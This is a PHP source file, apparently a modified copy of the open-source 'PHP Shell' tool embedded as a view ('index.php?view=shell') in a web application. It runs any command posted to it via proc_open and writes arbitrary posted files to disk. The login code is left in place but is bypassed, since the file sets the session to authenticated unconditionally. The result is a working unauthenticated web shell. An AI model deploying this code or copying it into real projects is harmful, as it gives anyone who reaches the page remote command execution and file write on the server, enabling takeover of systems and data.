<div class="view" id="view-shell"><?php // -*- coding: utf-8 -*-

define('PHPSHELL_VERSION', '2.2');
/*

  **************************************************************
  *                     PHP Shell                              *
  **************************************************************

  PHP Shell is an interactive PHP script that will execute any command
  entered.  See the files README, INSTALL, and SECURITY or
  http://phpshell.sourceforge.net/ for further information.

  Copyright (C) 2000-2010 the Phpshell-team

  This program is free software; you can redistribute it and/or
  modify it under the terms of the GNU General Public License
  as published by the Free Software Foundation; either version 2
  of the License, or (at your option) any later version.

  This program is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
  GNU General Public License for more details.

  You can get a copy of the GNU General Public License from this
  address: http://www.gnu.org/copyleft/gpl.html#SEC1
  You can also write to the Free Software Foundation, Inc., 59 Temple
  Place - Suite 330, Boston, MA  02111-1307, USA.
  
*/

/* There are no user-configurable settings in this file anymore, please see
 * config.php instead. */

header("Content-Type: text/html; charset=utf-8");

/* This error handler will turn all notices, warnings, and errors into fatal
 * errors, unless they have been suppressed with the @-operator. */
function error_handler($errno, $errstr, $errfile, $errline, $errcontext) {
    /* The @-operator (used with chdir() below) temporarely makes
     * error_reporting() return zero, and we don't want to die in that case.
     * We do note the error in the output, though. */
    if (error_reporting() == 0) {
        $_SESSION['output'] .= $errstr . "\n";
    } else {
        die('<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
   "http://www.w3.org/TR/html4/strict.dtd">
<html>
<head>
  <title>PHP Shell ' . PHPSHELL_VERSION . '</title>
  <meta http-equiv="Content-Script-Type" content="text/javascript">
  <meta http-equiv="Content-Style-Type" content="text/css">
  <meta name="generator" content="phpshell">
  <link rel="stylesheet" href="style.css" type="text/css">
</head>
<body>
  <h1>Fatal Error!</h1>
  <p><b>' . $errstr . '</b></p>
  <p>in <b>' . $errfile . '</b>, line <b>' . $errline . '</b>.</p>

  <hr>

  <p>Please consult the <a href="README">README</a>, <a
  href="INSTALL">INSTALL</a>, and <a href="SECURITY">SECURITY</a> files for
  instruction on how to use PHP Shell.</p>

  <hr>

  <address>
  Copyright &copy; 2000&ndash;2010, the Phpshell-team. Get the latest
  version at <a
  href="http://phpshell.sourceforge.net/">http://phpshell.sourceforge.net/</a>.
  </address>

</body>
</html>');
    }
}

/* Installing our error handler makes PHP die on even the slightest problem.
 * This is what we want in a security critical application like this. */
set_error_handler('error_handler');

/* Clear history */
function clear() {
  $_SESSION['output'] = '';
}

if (!function_exists('stripslashes_deep')) {
	function stripslashes_deep($value) {
		if (is_array($value))
			return array_map('stripslashes_deep', $value);
		else
			return stripslashes($value);
	}
}

if (get_magic_quotes_gpc())
    $_POST = stripslashes_deep($_POST);

/* Initialize some variables we need again and again. */
$username = isset($_POST['username']) ? $_POST['username'] : '';
$password = isset($_POST['password']) ? $_POST['password'] : '';
$nounce   = isset($_POST['nounce'])   ? $_POST['nounce']   : '';

$command  = isset($_POST['command'])  ? $_POST['command']  : '';
$rows     = isset($_POST['rows'])     ? $_POST['rows']     : 24;
$columns  = isset($_POST['columns'])  ? $_POST['columns']  : 80;


/* Load the configuration. */
$ini = parse_ini_file(dirname(__FILE__).'/config.shell.php', true);

if (empty($ini['settings']))
    $ini['settings'] = array();

/* Default settings --- these settings should always be set to something. */
$default_settings = array('home-directory'   => '.');
$showeditor = false;

/* Merge settings. */
$ini['settings'] = array_merge($default_settings, $ini['settings']);

    
/* Delete history if submitted */
if (isset($_POST['clear']))
    clear();

/* Initialize the session variables. */
if (empty($_SESSION['cwd'])) {
	$_SESSION['cwd'] = realpath($ini['settings']['home-directory']);
	$_SESSION['history'] = array();
	$_SESSION['output'] = '';
}
/* Clicked on one of the directory links in the working directory - ignore the command */
if (isset($_POST['levelup'])) {
$levelup = $_POST['levelup'] ;
while ($levelup > 0) {
	$command = '' ; /* ignore the command */
	$_SESSION['cwd'] = dirname($_SESSION['cwd']) ;
	$levelup -- ;
}
}
/* Selected a new subdirectory as working directory - ignore the command */
if (isset($_POST['changedirectory'])) {
$changedir= $_POST['changedirectory'];
if (strlen($changedir) > 0) {
	if (@chdir($_SESSION['cwd'] . '/' . $changedir)) {
	$command = '' ; /* ignore the command */
	$_SESSION['cwd'] = realpath($_SESSION['cwd'] . '/' . $changedir) ;
	}
}
}

/* Save content from 'editor' */
if(isset($_POST["filetoedit"]) && ($_POST["filetoedit"] != "")) {
	$filetoedit_handle = fopen($_POST["filetoedit"], "w");
	fputs($filetoedit_handle, str_replace("%0D%0D%0A", "%0D%0A", $_POST["filecontent"]));
	fclose($filetoedit_handle);
}

if (!empty($command)) {
	/* Save the command for late use in the JavaScript.  If the command is
	 * already in the history, then the old entry is removed before the
	 * new entry is put into the list at the front. */
	if (($i = array_search($command, $_SESSION['history'])) !== false)
		unset($_SESSION['history'][$i]);
	
	array_unshift($_SESSION['history'], $command);

	/* Now append the commmand to the output. */
	$_SESSION['output'] .= '$ ' . $command . "\n";

	/* Initialize the current working directory. */
	if (preg_match('/^[[:blank:]]*cd[[:blank:]]*$/', $command)) {
		$_SESSION['cwd'] = realpath($ini['settings']['home-directory']);
	} elseif (preg_match('/^[[:blank:]]*cd[[:blank:]]+([^;]+)$/', $command, $regs)) {
		/* The current command is a 'cd' command which we have to handle
		 * as an internal shell command. */

	/* if the directory starts and ends with quotes ("), remove them -
	   allows command like 'cd "abc def"' */
	if ((substr($regs[1],0,1) == '"') && (substr($regs[1],-1) =='"') ) {
	  $regs[1] = substr($regs[1],1) ;
	  $regs[1] = substr($regs[1],0,-1) ;
	}

		if ($regs[1]{0} == '/') {
			/* Absolute path, we use it unchanged. */
			$new_dir = $regs[1];
		} else {
			/* Relative path, we append it to the current working
			 * directory. */
			$new_dir = $_SESSION['cwd'] . '/' . $regs[1];
		}
  
		/* Transform '/./' into '/' */
		while (strpos($new_dir, '/./') !== false)
			$new_dir = str_replace('/./', '/', $new_dir);

		/* Transform '//' into '/' */
		while (strpos($new_dir, '//') !== false)
			$new_dir = str_replace('//', '/', $new_dir);

		/* Transform 'x/..' into '' */
		while (preg_match('|/\.\.(?!\.)|', $new_dir))
			$new_dir = preg_replace('|/?[^/]+/\.\.(?!\.)|', '', $new_dir);
  
		if ($new_dir == '') $new_dir = '/';
  
		/* Try to change directory. */
		if (@chdir($new_dir)) {
			$_SESSION['cwd'] = $new_dir;
		} else {
			$_SESSION['output'] .= "cd: could not change to: $new_dir\n";
		}

	} elseif (preg_match('/^[[:blank:]]*editor[[:blank:]]*$/', $command)) {
		/* You called 'editor' without a filename so you get an short help
		 * on how to use the internal 'editor' command */

		   $_SESSION['output'] .= " Syntax: editor filename\n (you forgot the filename)\n";
	
	} elseif (preg_match('/^[[:blank:]]*editor[[:blank:]]+([^;]+)$/', $command, $regs)) {
		/* This is a tiny editor which you can start with 'editor filename' */
	$filetoedit = $regs[1];
		if ($regs[1]{0} != '/') {
			/* relative path, add it to the current working directory.*/
			$filetoedit = $_SESSION['cwd'].'/'.$regs[1];
		} ;
		if(is_file(realpath($filetoedit)) || ! file_exists($filetoedit)) {
			$showeditor = true;
			if(file_exists(realpath($filetoedit)))
				$filetoedit = realpath($filetoedit);
		} else {
			$_SESSION['output'] .= " Syntax: editor filename\n (just regular or not existing files)\n";
		}

	} elseif (trim($command) == 'exit') {
		logout();
	} elseif (trim($command) == 'logout') {
		logout();
	} else {

		/* The command is not an internal command, so we execute it after
		 * changing the directory and save the output. */
		chdir($_SESSION['cwd']);

		// We canot use putenv() in safe mode.
		if (!ini_get('safe_mode')) {
			// Advice programs (ls for example) of the terminal size.
			putenv('ROWS=' . $rows);
			putenv('COLUMNS=' . $columns);
		}

		/* Alias expansion. */
		$length = strcspn($command, " \t");
		$token = substr($command, 0, $length);
		if (isset($ini['aliases'][$token]))
			$command = $ini['aliases'][$token] . substr($command, $length);

		$io = array();
		$p = proc_open($command,
					   array(1 => array('pipe', 'w'),
							 2 => array('pipe', 'w')),
					   $io);

		/* Read output sent to stdout. */
		while (!feof($io[1])) {
			$_SESSION['output'] .= htmlspecialchars(fgets($io[1]),
													ENT_COMPAT, 'UTF-8');
		}
		/* Read output sent to stderr. */
		while (!feof($io[2])) {
			$_SESSION['output'] .= htmlspecialchars(fgets($io[2]),
													ENT_COMPAT, 'UTF-8');
		}
		
		fclose($io[1]);
		fclose($io[2]);
		proc_close($p);
	}
}

/* Build the command history for use in the JavaScript */
if (empty($_SESSION['history'])) {
	$js_command_hist = '""';
} else {
	$escaped = array_map('addslashes', $_SESSION['history']);
	$js_command_hist = '"", "' . implode('", "', $escaped) . '"';
}

$_SESSION['authenticated'] = true;


?>
<h1>Shell</h1>

  <script type="text/javascript">
  <?php if ($_SESSION['authenticated'] && ! $showeditor) { ?>

  var current_line = 0;
  var command_hist = new Array(<?php echo $js_command_hist ?>);
  var last = 0;

  function key(e) {
    if (!e) var e = window.event;

    if (e.keyCode == 38 && current_line < command_hist.length-1) {
      command_hist[current_line] = document.shell.command.value;
      current_line++;
      document.shell.command.value = command_hist[current_line];
    }

    if (e.keyCode == 40 && current_line > 0) {
      command_hist[current_line] = document.shell.command.value;
      current_line--;
      document.shell.command.value = command_hist[current_line];
    }

  }

  function init() {
    document.shell.setAttribute("autocomplete", "off");
    document.shell.output.scrollTop = document.shell.output.scrollHeight;
    document.shell.command.focus()
  }

  <?php } elseif($_SESSION['authenticated'] && $showeditor) { ?>

  function init() {
    document.shell.filecontent.focus();
  }

  <?php } else { ?>

  function init() {
    document.shell.username.focus();
  }

  <?php } ?>
  function levelup(d) {
    document.shell.levelup.value=d ; 
    document.shell.submit() ;
  }
  function changesubdir(d) {
    document.shell.changedirectory.value=document.shell.dirselected.value ; 
    document.shell.submit() ;
  }
  
  $(function () {
	init();
  });
  </script>


<form name="shell" action="index.php?view=shell" method="post">
<div><input name="levelup" id="levelup" type="hidden"></div>
<div><input name="changedirectory" id="changedirectory" type="hidden"></div>
<?php
if (!$_SESSION['authenticated']) {
    /* Genereate a new nounce every time we preent the login page.  This binds
     * each login to a unique hit on the server and prevents the simple replay
     * attack where one uses the back button in the browser to replay the POST
     * data from a login. */
    $_SESSION['nounce'] = mt_rand();

?>

<fieldset>
  <legend>Authentication</legend>
  <?php
  if (!empty($username))
      echo "  <p class=\"error\">Login failed, please try again:</p>\n";
  else
      echo "  <p>Please login:</p>\n";
  ?>

  <label for="username">Username:</label>
  <input name="username" id="username" type="text" value="<?php echo $username
  ?>"><br>
  <label for="password">Password:</label>
  <input name="password" id="password" type="password">
  <p><input type="submit" value="Login"></p>
  <input name="nounce" type="hidden" value="<?php echo $_SESSION['nounce']; ?>">

</fieldset>

<?php } else { /* Authenticated. */ ?>
<fieldset>
  <legend><?php echo "Phpshell running on: " . $_SERVER['SERVER_NAME']; ?></legend>
<p>Current Working Directory:
<span class="pwd"><?php
    if( $showeditor ) {
	echo htmlspecialchars($_SESSION['cwd'], ENT_COMPAT, 'UTF-8') . '</span>';
    } else { /* normal mode - offer navigation via hyperlinks */
      $parts = explode('/', $_SESSION['cwd']);
     
      for($i=1; $i<count($parts); $i=$i+1) {
        echo '<a class="pwd" title="Change to this directory. Your command will not be executed." href="javascript:levelup(' . (count($parts)-$i) . ')">/</a>' ;
        echo htmlspecialchars($parts[$i], ENT_COMPAT, 'UTF-8') ;
      }
      echo '</span>';
      /* Now we make a list of the directories. */
      $dir_handle = opendir($_SESSION['cwd']);
      /* We store the output so that we can sort it later: */
      $options = array();
      /* Run through all the files and directories to find the dirs. */
      while ($dir = readdir($dir_handle)) {
	if (($dir != '.') and ($dir != '..') and is_dir($_SESSION['cwd'] . "/" . $dir)) {
	  $options[$dir] = "<option value=\"/$dir\">$dir</option>";
	}
      }
      closedir($dir_handle);
      if (count($options)>0) {
	ksort($options);
	echo '<br><a href="javascript:changesubdir()">Change to subdirectory</a>: <select name="dirselected">';
	echo implode("\n", $options);
	echo '</select>';
      }
    }
?>
<br>

    <?php if(! $showeditor) { /* Outputs the 'terminal' without the editor */ ?>

<div id="terminal">
<textarea name="output" readonly="readonly" cols="<?php echo $columns ?>" rows="<?php echo $rows ?>">
<?php
$lines = substr_count($_SESSION['output'], "\n");
$padding = str_repeat("\n", max(0, $rows+1 - $lines));
echo rtrim($padding . $_SESSION['output']);
?>
</textarea>
<p id="prompt">
  $&nbsp;<input name="command" type="text"
                onkeyup="key(event)" size="<?php echo $columns-2 ?>" tabindex="1">
</p>
</div>

    <?php } else { /* Output the 'editor' */ ?>
    <?php print("You are editing this file: ".$filetoedit); ?>

<div id="terminal">
<textarea name="filecontent" cols="<?php echo $columns ?>" rows="<?php echo $rows ?>">
<?php
    if(file_exists($filetoedit)) {
         print(htmlspecialchars(str_replace("%0D%0D%0A", "%0D%0A", file_get_contents($filetoedit))));		 
    }
?>
</textarea>
</div>

<?php } /* End of terminal */ ?>

<p>
<?php if(! $showeditor) { /* You can not resize the textarea while
                           * the editor is 'running', because if you would
                           * do so you would lose the changes you have
                           * already made in the textarea since last saving */
?>
  <span style="float: right">Size: <input type="text" name="rows" size="2"
  maxlength="3" value="<?php echo $rows ?>"> &times; <input type="text"
  name="columns" size="2" maxlength="3" value="<?php echo $columns
  ?>"></span>
<?php } ?>


<?php if(! $showeditor) { /* for normal 'non-editor-mode' */ ?>
<input type="submit" value="Execute Command">
<input type="submit" name="clear" value="Clear">
<?php } else { /* for 'editor-mode' */ ?>
<input type="hidden" name="filetoedit" id="filetoedit" value="<?php print($filetoedit) ?>">
<input type="submit" value="Save and Exit">
<input type="reset" value="Undo all Changes">
<input type="submit" value="Exit without saving" onclick="javascript:document.getElementById('filetoedit').value='';return true;">
<?php } ?>

</p>
</fieldset>

<?php } ?>

</form>
</div>